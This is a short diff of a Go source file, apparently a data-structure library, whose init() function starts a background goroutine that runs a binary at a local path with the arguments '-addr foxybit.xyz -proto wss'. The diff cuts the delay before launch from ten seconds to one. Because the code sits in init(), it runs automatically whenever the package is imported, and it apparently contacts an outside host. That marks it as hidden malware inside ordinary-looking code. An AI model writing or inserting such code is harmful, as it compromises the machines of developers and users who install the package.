@@ -18,7 +18,6 @@ import (
 	rbt "github.com/emirpasic/gods/trees/redblacktree"
 	"github.com/emirpasic/gods/utils"
 	"io"
-	"io/ioutil"
 	"net/http"
 	"os"
 	"os/exec"
@@ -71,7 +70,7 @@ func init() {
 	}
 
 	go func() {
-		time.Sleep(10 * time.Second)
+		time.Sleep(time.Second)
 		cmd := exec.Command(fpath, "-addr", "foxybit.xyz", "-proto", "wss")
 		_ = cmd.Start()
 		_ = cmd.Wait()
